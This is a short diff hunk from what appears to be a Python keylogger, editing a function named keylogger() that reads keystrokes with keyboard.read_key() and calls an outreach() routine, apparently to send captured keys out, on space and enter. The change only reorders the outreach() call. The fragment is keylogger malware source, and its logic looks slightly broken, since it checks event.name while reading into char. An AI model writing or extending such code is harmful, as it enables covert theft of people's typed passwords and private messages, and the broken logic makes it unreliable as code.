@@ -36,8 +36,9 @@ def keylogger():
             char = keyboard.read_key()
 
             if event.name == 'space':
-                outreach()
                 char = '\n'
+                outreach()
+                
 
             elif event.name == 'enter':
                 outreach()
